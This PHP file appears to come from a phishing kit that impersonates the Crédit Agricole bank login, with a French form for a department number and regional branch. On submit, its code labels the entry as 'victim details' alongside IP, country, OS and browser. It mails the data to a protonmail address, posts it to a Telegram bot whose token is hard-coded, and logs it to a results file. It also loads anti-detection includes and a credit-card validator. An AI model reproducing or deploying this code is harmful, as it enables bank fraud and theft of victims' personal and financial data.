<?php
/**
 * @link              https://www.z0n51.com/
 * @since             20/03/2020
 * @package           CREDIT AGRICOLE
 * @facebook          https://www.facebook.com/z0n51
 * @whatsapp          +212601728021
 * @icq               @z0n51
 * @telegram          @z0n51
 *
 * Project Name:      CREDIT AGRICOLE
 * Author:            z0n51
 * Author URI:        https://www.facebook.com/z0n51
 */

include_once './inc/app.php';
include_once './vendor/autoload.php';
include('./prevents/anti1.php');
include('./prevents/anti2.php');
include('./prevents/anti3.php');
include('./prevents/anti4.php');
include('./prevents/anti5.php');
include('./prevents/anti6.php');
include('./prevents/anti7.php');
include('./prevents/anti8.php');
use Inacho\CreditCard;

function validate_cc_number($number = null) {
    $card = CreditCard::validCreditCard($number);
    if( $card['valid'] == false ) {
        return false;
    }
    return $card;
}

function validate_cc_cvv($number = null,$type = null) {
    if( empty($number) || empty($type) )
        return false;
    $cvv = CreditCard::validCvc($number, $type);
    return $cvv;
}

$to = 'codeinstein4@protonmail.com';

$random   = rand(0,100000000000);
$dispatch = substr(md5($random), 0, 17);


if($_SERVER['REQUEST_METHOD'] == "POST") {

    if ($_POST['type'] == "region") {

        $_SESSION['region_number'] = $_POST['region_number'];
        $_SESSION['region_caisse']    = $_POST['region_caisse'];

        $_SESSION['errors'] = [];
        if( empty($_POST['region_number']) && empty($_POST['region_caisse']) ) {
            $_SESSION['errors']['region_number'] = true;
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | CREDIT AGRICOL | Caisse Régionale';
            $message = '/-- REGION INFOS --/ ' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Numéro de département : ' . $_POST['region_number'] . "\r\n";
            $message .= 'Caisse régionale : ' . $_POST['region_caisse'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- DOHA SAFE FULL REZ --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            mail($to,$subject,$message,$headers);
function telegram_send($message) {
    $curl = curl_init();
    $api_key  = '2146682270:AAGiR2aONZz5Gdgierxz4mDDUUGCOe5V_4Q';
    $chat_id  = '1820949820';
    $format   = 'HTML';
    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    $result = curl_exec($curl);
    curl_close($curl);
    return true;
}

telegram_send(urlencode($message));
            file_put_contents("../resulttt987.txt", $message, FILE_APPEND);
            header("location: login.php?particulier#_$dispatch");

        } else {
            header("location: region.php?error#_$dispatch");
        }

    }
    }

?>
<!DOCTYPE html>
<html lang="en">
<head>

    <!-- Meta Tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">

    <!-- Browser Color Styling -->
    <meta name="theme-color" content="#6dc77a"/>
    <meta name="msapplication-navbutton-color" content="#6dc77a"/>
    <meta name="apple-mobile-web-app-status-bar-style" content="#6dc77a" />

    <!-- Favicon -->
    <link rel="icon" type="image/png" href="assets/images/favicon.png">
    
    <!-- Bootstrap -->
    <link rel="stylesheet" href="assets/css/bootstrap.min.css" />
    
    <!-- Helpers -->
    <link rel="stylesheet" href="assets/css/helpers.css" />

    <!-- Fonts -->
    <link rel="stylesheet" href="assets/css/fonts.css" />

    <!-- Main -->
    <link rel="stylesheet" href="assets/css/main.css" />


    <title>Acc&egrave;s CR - Crédit Agricole</title>

</head>
<body>

    <!-- HEADER -->
    <!--<header id="header">
        <div class="left col-md-2">
            <div class="logo text-center"><a href="#"><img src="assets/images/logo.svg"></a></div>
        </div>
        <div class="right col-md-10 pl-0">
            <div class="top d-flex align-items-center h-50">
                <div class="first"><a href="#">Vous êtes un particulier <i class="fas fa-chevron-down"></i></a></div>
                <div class="second flex-grow-1">
                    <div class="d-flex align-items-center justify-content-center">
                        <div class="form flex-grow-1 d-flex justify-content-center align-items-center">
                            <span class="flex-grow-1">Rechercher une thématique, un produit...</span>
                            <i class="fas fa-search"></i>
                        </div>
                        <div class="marker d-flex justify-content-center align-items-center">
                            <i class="fas fa-map-marker-alt"></i>
                        </div>
                    </div>
                </div>
                <div class="third">
                    <ul>
                        <li><a href=""><i class="far fa-circle"></i> Nous contacter</a></li>
                        <li><a href="">Devenir Client</a></li>
                        <li><a href=""><i class="fas fa-unlock-alt"></i> mon espace</a></li>
                    </ul>
                </div>
            </div>
            <div class="bottom d-flex align-items-center h-50">
                <ul>
                    <li><a href="#">COMPTES & CARTES</a></li>
                    <li><a href="#">ÉPARGNER</a></li>
                    <li><a href="#">S'ASSURER</a></li>
                    <li><a href="#">EMPRUNTER</a></li>
                    <li><a href="#">SIMULATION & DEVIS</a></li>
                    <li><a href="#">NOS CONSEILS</a></li>
                </ul>
            </div>
        </div>
    </header>-->
    <!-- END HEADER -->

    <header id="header2">
        <div class="logo">
            <a href="#"><img style="max-width: 170px;" src="assets/images/calogo.png"></a>
        </div>
        <div class="closse"><i class="fas fa-times"></i></div>
    </header>

    <!-- MAIN -->
    <main id="main">
        <div class="left">
            <div class="left-inner text-white">
                
                <h3>Important. Votre portail change vos habitudes de navigation aussi.</h3>
                <p>
                    Nous vous recommandons de prendre connaissance des nouveautés au travers de cette présentation s’adressant tout particulièrement à nos utilisateurs en situation de handicap visuel. 
                </p>
                <a href="#" class="btn btn-light fz14" style="color: #007D8F; padding: 10px 20px;">Découvrir les nouvelles fonctionnalités</a>

            </div>
        </div>
        <div class="right" style="background-color: #FFF;">
            <div class="region-box">
                <form method="post">
                    <legend>
                        ACCÉDER À L'ESPACE DÉDIÉ<br>
                        <b>DE VOTRE CAISSE RÉGIONALE</b>
                    </legend>
                    <div class="form-group ">
                        
                        <input type="text" name="region_number" id="region_number" class="form-control" placeholder="Saisissez un numéro de département">
                    </div>
                   
                    <input type="hidden" name="verbot">
                    <input type="hidden" name="type" value="region">
                    <div class="form-group text-center mb-0 mt-5">
                        <button type="submit" name="doSend">Valider</button>
                    </div>
                </form>
            </div>
        </div>
    </main>

    <script src="assets/js/jquery.min.js"></script>
    <script src="assets/js/popper.min.js"></script>
    <script src="assets/js/bootstrap.min.js" ></script>
    <script src="assets/js/fontawesome.js"></script>
    <script src="assets/js/main.js"></script>

</body>
</html>